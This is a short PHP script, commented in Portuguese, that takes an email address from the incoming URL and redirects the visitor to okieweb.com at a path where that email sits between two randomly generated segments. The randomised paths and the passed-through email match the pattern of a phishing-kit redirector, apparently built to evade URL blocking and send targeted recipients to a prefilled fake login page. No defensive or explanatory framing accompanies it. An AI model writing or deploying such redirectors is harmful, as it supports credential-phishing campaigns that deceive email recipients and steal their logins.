<?php
// Pega o email da URL de entrada
$requestUri = $_SERVER['REQUEST_URI'];
$email = '';

if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
    $email = $matches[1];
}

$baseUrl = 'https://www.okieweb.com/';

function generateSegment($length) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
}

// Monta as URLs com o email embutido no meio dos segmentos randômicos
$urls = [
    $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
    $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
];

$randomUrl = $urls[array_rand($urls)];
header("Location: " . $randomUrl);
exit();
?>
